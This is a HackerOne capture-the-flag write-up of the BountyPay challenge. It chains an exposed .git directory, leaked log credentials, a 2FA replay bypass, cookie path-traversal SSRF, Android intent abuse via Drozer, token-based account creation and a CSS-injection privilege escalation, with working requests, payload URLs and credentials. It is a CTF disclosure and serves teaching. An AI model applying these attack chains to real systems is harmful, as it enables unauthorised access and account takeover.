# [H1-2006 2020] Multiple vulnerabilities allow to leak sensitive information 

## Report Details
- **Report ID**: 895202
- **URL**: https://hackerone.com/reports/895202
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-06-10T06:38:05.934Z
- **Disclosed**: 2020-06-22T16:24:24.144Z

## Reporter
- **Username**: zoczus
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Summary:
---------------------
Hello team! This report is detailed write-up for chain of vulnerabilities that ended up with leaking sensitive information - a flag. CTF itself was really fun and I've enjoyed it. Hope you find my report valid and useful. 

Steps To Reproduce:
---------------------

## Reconnaissance phase 

Scope of CTF are all subdomains of `bountypay.h1ctf.com`. As first step - let's search for available subdomains using [Certificate Search](https://crt.sh/) tool: 

{F861474}

I've picked randomly `app.bountypay.h1ctf.com` that shows login page after connectiong to HTTP server. As part of active reconnaissance I've used [ffuf](https://github.com/ffuf/ffuf) tool with one of common wordlists from [SecLists](https://github.com/danielmiessler/SecLists).

{F861475}

*ffuf* output:
```
[ zoczus@ropchain:~/tools/ffuf ]> ./ffuf -u "https://app.bountypay.h1ctf.com/FUZZ" -fc 404 -w /opt/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://app.bountypay.h1ctf.com/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 404
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
images                  [Status: 301, Size: 194, Words: 7, Lines: 8]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
:: Progress: [4666/4666] :: Job [1/1] :: 358 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

`.git/HEAD` file seems to be interesting and bring us our first vulnerability. 

## Information Disclosure - .git directory available

Previously founded `.git/HEAD` file suggest that [Git](https://en.wikipedia.org/wiki/Git) repository were used. Checking if there's a `config` file reveals interesting information:

```
[ zoczus@ropchain:~ ]> curl "https://app.bountypay.h1ctf.com/.git/config"
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = https://github.com/bounty-pay-code/request-logger.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
        remote = origin
        merge = refs/heads/master
```

So there's a public [Github](https://github.com/bounty-pay-code/request-logger.git) repository containing one file - `logger.php`

{F861483}

```php
<?php

$data = array(
  'IP'        =>  $_SERVER["REMOTE_ADDR"],
  'URI'       =>  $_SERVER["REQUEST_URI"],
  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
  'PARAMS'    =>  array(
      'GET'   =>  $_GET,
      'POST'  =>  $_POST
  )
);

file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
```

This reveals another file available on server - `bp_web_trace.log`:

```
[ zoczus@ropchain:~/stuff/bounty/h1ctf ]> curl "https://app.bountypay.h1ctf.com/bp_web_trace.log"
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```

After decoding [Base64](https://en.wikipedia.org/wiki/Base64) strings: 

```json
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```

We can see credentials in log file and try to use it  in web application. After success - we're getting 2FA screen. 

{F861488}

## 2FA Bypass

Let's take a look in HTML form generated by application

```html
<form method="post" action="/">
   <input type="hidden" name="username" value="brian.oliver">
   <input type="hidden" name="password" value="V7h0inzX">
   <input type="hidden" name="challenge" value="8e3e68be36e6f28a7b93222a0cb0a216">
   <div class="panel panel-default" style="margin-top:50px">
      <div class="panel-heading">Login</div>
      <div class="panel-body">
         <div style="margin-top:7px"><label>For Security we've sent a 10 character password to your mobile phone, please enter it below</label></div>
         <div style="margin-top:7px"><label>Password contains characters between A-Z , a-z and 0-9</label></div>
         <div><input name="challenge_answer" class="form-control"></div>
      </div>
   </div>
   <input type="submit" class="btn btn-success pull-right" value="Login">
</form>
```

In above form we can see *challenge* param that looks like [MD5 hash](https://en.wikipedia.org/wiki/MD5). By replacing *challenge* value md5 hash of **bD83Jk27dQ** (*challenge answer* from `bp_web_trace.log`) - we can re-use previously generated pair of challenge and answer and gain access to system.

HTTP login request:

```
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:77.0) Gecko/20100101 Firefox/77.0
(...)

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

HTTP response:

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 10 Jun 2020 00:13:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Fri, 10-Jul-2020 00:13:51 GMT; Max-Age=2592000
Location: /
Content-Length: 0
```

{F861498}

## SSRF in api.bountypay.h1ctf.com

Application dashboard on `app.bountypay.h1ctf.com` doesn't show much more than **Load Transactions** button, that shows no data. But it sends requests to `/statements` endpoint:

```
GET /statements?month=01&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:77.0) Gecko/20100101 Firefox/77.0
(...)
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

...and response body:

```json
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020",
    "data": "{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
}
```

There are few interesting things here:
- URL to `https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020` in HTTP response
- `token` cookie with base64 encoded data in HTTP request

Let's visit `api.bountypay.h1ctf.com` page:

{F861503}

After clicking [REST API](https://api.bountypay.h1ctf.com/redirect?url=https://www.google.com/search?q=REST+API) hyperlink - it first requests to `/redirect` endpoint and then - returns HTTP 302 code as response which redirects us to page provided in *url* parameter.

```
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 10 Jun 2020 00:37:13 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: https://www.google.com/search?q=REST API
Content-Length: 0
```

Let's get back to **token** cookie. After decoding base64 we can find the same string (*account_id*) which is used in request to `api.bountypay.h1ctf.com`

```json
{
    "account_id": "F8gHiqSdpK",
    "hash": "de235bffd23df6995ad4e0930baac1a2"
}
```

By modifying *account_id* value to **F8gHiqSdpK/../../../?** and base64 encode whole string again - web application should request directly to `https://api.bountypay.h1ctf.com/` because of [Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include). 

Response from `/statements` endpoint that shows HTML code of `api.bountypay.h1ctf.com` page - which proves [SSRF vulnerability](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery).
```json
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/?\/statements?month=01&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>BountyPay | Login<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <div class=\"text-center\" style=\"margin-top:30px\"><img src=\"\/images\/bountypay.png\" height=\"150\"><\/div>\n            <h1 class=\"text-center\">BountyPay API<\/h1>\n            <p style=\"text-align: justify\">Our BountyPay API controls all of our services in one place. We use a <a href=\"\/redirect?url=https:\/\/www.google.com\/search?q=REST+API\">REST API<\/a> with JSON output. If you are interested in using this API please contact your account manager.<\/p>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"
}
```

HTML formatted:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>BountyPay | Login</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <div class="text-center" style="margin-top:30px"><img src="/images/bountypay.png" height="150"></div>
            <h1 class="text-center">BountyPay API</h1>
            <p style="text-align: justify">Our BountyPay API controls all of our services in one place. We use a <a href="/redirect?url=https://www.google.com/search?q=REST+API">REST API</a> with JSON output. If you are interested in using this API please contact your account manager.</p>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```
Moving forward - I've tried to make SSRF requests to `https://api.bountypay.h1ctf.com/redirect` endpoint. Basing on tests there are whitelist of URLs that we can be redirected to. Some of allowed URLs are those found in reconnaissance phase. For example, by visiting `software.bountypay.h1ctf.com` from browser, we can see such response:

{F861522}

But by using SSRF - we can see response from this server:

```json
{
    "url": "https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/..\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/&\/statements?month=01&year=2020",
    "data": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"
}
```

HTML formatted: 

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Software Storage</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>

<div class="container">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3">
            <h1 style="text-align: center">Software Storage</h1>
            <form method="post" action="/">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Login</div>
                    <div class="panel-body">
                        <div style="margin-top:7px"><label>Username:</label></div>
                        <div><input name="username" class="form-control"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input name="password" type="password" class="form-control"></div>
                    </div>
                </div>
                <input type="submit" class="btn btn-success pull-right" value="Login">
            </form>
        </div>
    </div>
</div>
<script src="/js/jquery.min.js"></script>
<script src="/js/bootstrap.min.js"></script>
</body>
</html>
```

## Directory Listing on software.bountypay.h1ctf.com

Now, after achieving access to `software.bountypay.h1ctf.com` - I've automated directory enumeration and one interesting directory were found - `/uploads`. Here's HTML formatted response body:

```html
<html>
   <head>
      <title>Index of /uploads/</title>
   </head>
   <body bgcolor=white>
      <h1>Index of /uploads/</h1>
      <hr>
      <pre><a href=../>../</a>
<a href=/uploads/BountyPay.apk>BountyPay.apk</a>                                        20-Apr-2020 11:26              4043701
</pre>
      <hr>
   </body>
</html>
```

Direct request from browser to disclosed `BountyPay.apk` file successed with downloading file. 

## Android application static and dynamic analysis

[APK](https://en.wikipedia.org/wiki/Android_application_package) file is Android Application Package. File itself is a [ZIP](https://en.wikipedia.org/wiki/Zip_(file_format)) format, which we can be easily extracted unsing `unzip` command. Package contains files such as:
- Design resources files
- Android Manifest
- classes.dex 

Last file contains application bytecode. By using [dex2jar](https://sourceforge.net/projects/dex2jar/) and [jd-gui](http://java-decompiler.github.io/) tools we can get decompiled Java code.

```
[ zoczus@kali:~/bounty/h1ctf ]> d2j-dex2jar classes.dex
dex2jar classes.dex -> ./classes-dex2jar.jar
[ zoczus@kali:~/bounty/h1ctf ]> jd-cli classes-dex2jar.jar
[ zoczus@kali:~/bounty/h1ctf ]> mkdir src
[ zoczus@kali:~/bounty/h1ctf ]> mv classes-dex2jar.src.jar src
[ zoczus@kali:~/bounty/h1ctf ]> cd src
[ zoczus@kali:~/bounty/h1ctf/src ]> jar xf classes-dex2jar.src.jar
```

We'll use decompiled code later. For now - let's install `BountyPay.apk` on Android phone. After running it we can see such screen:

{F861761}

After filling data (with anything) and submiting it - we can see activity called PartOneActivity:

{F861762}

I've decided to use [Drozer](https://labs.f-secure.com/tools/drozer/) tool which helps with dynamic analysis of Android applications. 

```
Selecting a85667c5760b3f76 (Xiaomi Redmi 6A 8.1.0)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.4.4)
dz> run shell.exec "pm list packages | grep bounty"
package:bounty.pay
dz> run app.package.attacksurface bounty.pay
Attack Surface:
  5 activities exported
  1 broadcast receivers exported
  0 content providers exported
  0 services exported
    is debuggable
```

There are 5 exported activities:

```
dz> run app.activity.info -a bounty.pay
Package: bounty.pay
  bounty.pay.PartThreeActivity
    Permission: null
  bounty.pay.PartTwoActivity
    Permission: null
  bounty.pay.PartOneActivity
    Permission: null
  bounty.pay.MainActivity
    Permission: null
  com.google.firebase.auth.internal.FederatedSignInActivity
    Permission: com.google.firebase.auth.api.gms.permission.LAUNCH_FEDERATED_SIGN_IN
dz> run scanner.activity.browsable -a bounty.pay
Package: bounty.pay
  Invocable URIs:
    three://part
    two://part
    one://part
  Classes:
    bounty.pay.PartThreeActivity
    bounty.pay.PartTwoActivity
    bounty.pay.PartOneActivity
```

It's time to take a look into source code. There's `PartOneActivity.java` containing such part:

```java
    if ((getIntent() != null) && (getIntent().getData() != null))
    {
      String str = getIntent().getData().getQueryParameter("start");
      if ((str != null) && (str.equals("PartTwoActivity")) && (paramBundle.contains("USERNAME")))
      {
        str = paramBundle.getString("USERNAME", "");
        SharedPreferences.Editor localEditor = paramBundle.edit();
        paramBundle = paramBundle.getString("TWITTERHANDLE", "");
        localEditor.putString("PARTONE", "COMPLETE").apply();
        logFlagFound(str, paramBundle);
        startActivity(new Intent(this, PartTwoActivity.class));
      }
    }
```

Getting back to Drozer - we can start another activity with such uri:

```
dz> run app.activity.start --action android.intent.action.VIEW --data-uri "one://part?start=PartTwoActivity"
```

{F861767}

Step one completed - let's now review `PartTwoActivity.java`:

```java
    if ((getIntent() != null) && (getIntent().getData() != null))
    {
      Object localObject2 = getIntent().getData();
      localObject1 = ((Uri)localObject2).getQueryParameter("two");
      localObject2 = ((Uri)localObject2).getQueryParameter("switch");
      if ((localObject1 != null) && (((String)localObject1).equals("light")) && (localObject2 != null) && (((String)localObject2).equals("on")))
      {
        localEditText.setVisibility(0);
        localButton.setVisibility(0);
        paramBundle.setVisibility(0);
      }
    }
```

Getting back to drozer:

```
dz> run app.activity.start --action android.intent.action.VIEW --data-uri "two://part?two=light&switch=on"
```

This showed us new form: 

{F861768}

Code responsible for checking value: 

```java
      public void onDataChange(DataSnapshot paramAnonymousDataSnapshot)
      {
        String str1 = (String)paramAnonymousDataSnapshot.getValue();
        Object localObject = getSharedPreferences("user_created", 0);
        paramAnonymousDataSnapshot = ((SharedPreferences)localObject).edit();
        String str2 = paramView;
        StringBuilder localStringBuilder = new StringBuilder();
        localStringBuilder.append("X-");
        localStringBuilder.append(str1);
        if (str2.equals(localStringBuilder.toString()))
        {
          str1 = ((SharedPreferences)localObject).getString("USERNAME", "");
          localObject = ((SharedPreferences)localObject).getString("TWITTERHANDLE", "");
          PartTwoActivity.this.logFlagFound(str1, (String)localObject);
          paramAnonymousDataSnapshot.putString("PARTTWO", "COMPLETE").apply();
          PartTwoActivity.this.correctHeader();
        }
        else
        {
          Toast.makeText(PartTwoActivity.this, "Try again! :D", 0).show();
        }
      }
    });
```

Application gets data to compare from firebase database. In shared preferences there's [Firebase](https://firebase.google.com/) *access_token* we can use to connect to Firebase. We could also try to bypass [SSL Pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning) and see data in network traffic or use [Frida](https://frida.re/) or [Objection](https://github.com/sensepost/objection) tools to hook into functions and see compared values. Lucky for me- I've just simply tried *X-Token* value found in `PartThreeActivity.java` which worked:

```java
  byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0); // this one decodes to "X-Token" string
```

{F861769}

Submiting form brings us to last - PartThreeActivity. This one was hardest to read and contains lots of obfuscated code, so let's divide it into few parts:

{F861764}

First - variables initiation and decoding:

```java
    if ((getIntent() != null) && (getIntent().getData() != null))
    {
      final Object localObject3 = getIntent().getData();
      localObject2 = ((Uri)localObject3).getQueryParameter("three");
      localObject1 = ((Uri)localObject3).getQueryParameter("switch");
      localObject3 = ((Uri)localObject3).getQueryParameter("header");
      final Object localObject4 = Base64.decode((String)localObject2, 0);
      final Object localObject5 = Base64.decode((String)localObject1, 0);
      localObject4 = new String((byte[])localObject4, StandardCharsets.UTF_8);
      localObject5 = new String((byte[])localObject5, StandardCharsets.UTF_8);
```

Second - comparition of values:

```java
public void onDataChange(DataSnapshot paramAnonymousDataSnapshot)
        {
          String str = (String)paramAnonymousDataSnapshot.getValue();
          if ((localObject2 != null) && (localObject4.equals("PartThreeActivity")) && (localObject1 != null) && (localObject5.equals("on")))
          {
            paramAnonymousDataSnapshot = localObject3;
            if (paramAnonymousDataSnapshot != null)
            {
              StringBuilder localStringBuilder = new StringBuilder();
              localStringBuilder.append("X-");
              localStringBuilder.append(str);
              if (paramAnonymousDataSnapshot.equals(localStringBuilder.toString()))
              {
                paramBundle.setVisibility(0);
                localButton.setVisibility(0);
                thread.start();
              }
            }
          }
```

Getting it all together:
- `localObject4` value should be **PartThreeActivity**
- `localObject4` is base64 decoded value of `localObject2`
- `localObject2` is value of query param *three*
- `localObject5` value should be **on**
- `localObject5` is base64 decoded value of `localObject1`
- `localObject1` is value of query param *switch* 
- `localStringBuilder` value should be equal to `paramAnonymousDataSnapshot`
- `paramAnonymousDataSnapshot` is equal to `localObject3`
- `localStringBuilder` have value of **X-** + str - which I've assumed it can be **X-Token**
- `localObject3` is value of query param *header*

Getting this all above with Drozer: 

```
dz> run app.activity.start --action android.intent.action.VIEW --data-uri "three://part?three=UGFydFRocmVlQWN0aXZpdHk=&switch=b24=&header=X-Token"
```

We can see another form asking to provide *leaked hash*. 

{F861765}

By reviewing files in filesystem, we can file  `/data/data/bounty.pay/shared_prefs/user_created.xml`:
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="PARTTWO">COMPLETE</string>
    <string name="USERNAME">zoczus</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="TWITTERHANDLE">zoczus</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
</map>
```

By provinding *TOKEN* value into form confirms that we've finished all Android challenges. Obtained information will be useful  with futher tasks.

{F861766}

{F861763}

## OSINT 

One of hints to CTF was available on [BountyPay Twitter](https://twitter.com/BountyPayHQ). 

{F861635}

Recent tweet says about new employee - Sandra! Her [profile](https://twitter.com/SandraA76708114) could be found by reviewing BountyPay "Following" list:

{F861634}

The one and only tweet from Sandra is about her first day at work showing picture of her badge with employee identifier - **STF:8FJ3KFISL3**

{F861636}

Let's write down those informations for later.

## Sensitive Information Disclosure - API 

I've used *ffuf* tool again to enumerate api endpoints on `api.bountypay.h1ctf.com`:

```
[ zoczus@ropchain:~/tools/ffuf ]> ./ffuf -u "https://api.bountypay.h1ctf.com/api/FUZZ" -fc 404 -w /opt/common.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : https://api.bountypay.h1ctf.com/api/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 404
________________________________________________

staff                   [Status: 401, Size: 28, Words: 4, Lines: 1]
```

Direct call to `/api/staff` endpoint show error about missing Token:

```
[ zoczus@ropchain:~ ]> curl "https://api.bountypay.h1ctf.com/api/staff"
["Missing or invalid Token"]
```

Be using data leaked in Android task, let's try using X-Token header:

```
[ zoczus@ropchain:~ ]> curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1"
[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
```

Changing HTTP method to POST:

```
[ zoczus@ropchain:~ ]> curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -X POST
["Missing Parameter"]
```

Using parameter names from previously returned data and Sandra staff_id: 

```
[ zoczus@ropchain:~ ]> curl https://api.bountypay.h1ctf.com/api/staff -H "X-Token: 8e9998ee3137ca9ade8f372739f062c1" -X POST -d "name=XXX&staff_id=STF:8FJ3KFISL3&password=test"
{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```

## Privilege Escalation in Staff Portal 

After collecting Sandra's credentials we can try login to [Staff](https://staff.bountypay.h1ctf.com/?template=home) portal on `staff.bountypay.h1ctf.com`.

 {F861643}

To understand vulnerability here - first let's review [/js/website.js](https://staff.bountypay.h1ctf.com/js/website.js) file:

```javascript
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

Most important things to note here:
- There's function that calls `/admin/upgrade?username=....` and gives user administrator privileges
- There's endpoint `/admin/report?url=...` that reports to admin that something's wrong with provided URL. 
- At the end there are couple of `location.hash` checks and `click` event triggers based on css selector (tab1/tab2/tab3/tab4)

All of above are important to escalate privileges. Let's simply try direct calling `/admin/upgrade?username=sandra.allison` endpoint:

```json
["Only admins can perform this"]
```

Sadly - it didn't worked. 

On bottom of website there's also a hyperlink called **Report This Page** that shows modal:

{F861662}

Clicking **Submit** cause HTTP request send:

```
GET /admin/report?url=Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODI= HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: */*
(...)
```

Where *url* parameter contains base64 encoded value of current URL. Basing on modal message - `/admin` endpoints are ignored (which I've confirmed with multiple tests). Let's note this information for future.

Next - by clicking around application we can notice `template` GET parameter that changes current application view. While playing around with it - we can see that modifing `template` to `template[]` (as array) and providing multiple values cause rendering few views at same time. For example for [/?template[]=login&template[]=home](https://staff.bountypay.h1ctf.com/?template[]=login&template[]=home) - will show both Login Form and main menu:

{F861684}

Also important to note is fact, that providing `username` parameter with `template=login` together cause that *Username* field in form is filled with parameter value. For example [/?template=login&username=test.test](https://staff.bountypay.h1ctf.com/?template=login&username=test.test):

{F861683}

Last element in this puzzle is *Profile* section when user can change it's *Profile Name* and *Avatar*:

{F861685}

Submiting form cause such HTTP request is sent:

```
POST /?template=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
(...)

profile_name=asdasda&profile_avatar=avatar2
```

Both *profile_name* and *profile_avatar* values can be anything. It's saved with user profile and later - rendered for example in *Tickets* view.  Let's provide **hackerone** as *profile_avatar* value and see how *Tickets* section looks like: 

{F861688}

After checking part of rendered HTML code around user's profile: 

```html
<div class="panel-heading">Reply</div>
<div class="panel-body">
<div style="width: 100px;position: absolute">
   <div style="margin:auto" class="avatar hackerone"></div>
   <div class="text-center">asdasdak</div>
</div>
```

...we can see that our *profile_avatar* value is part of `class` attribute. Let's get back again to `website.js` code snippet:

```javascript
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
```

Basing on above code:
- Function will be called when **click** event on `upgradeToAdmin` CSS selector is fired
- Username needed in `/admin/upgrade` endpoint is taken from `<input name="username">` value
- All of above needs to be called by Administrator. 

So putting it all together:
- We should put own CSS selectors by changing *profile_avatar* values into **upgradeToAdmin** and **tab2**
- We should render a page that contains both *Ticket* page view and *Login* page view - so both `<input name="username">` and element with our CSS selector will be rendered at same page.
- We should also change *value* of username input into **sandra.allison**
- We should trigger **click** event (which can be achieved by providing `#tab2` into URL)
- Finally - we should report created crafted URL to admin which exploits this vulnerability.

Final URL:  `https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&ticket_id=3582&username=sandra.allison#tab2`
Final Report URL: `https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjI=`

Sending report cause privileges escalated to Admin:

{F861697}

We've got Marten username and password! :-) 

## 2FA Bypass  part 2

Found username and password works well in [App Portal](https://app.bountypay.h1ctf.com/). After bypassing first 2FA in same way like in previous steps, we can receive Dashboard with payment information:

{F861703}

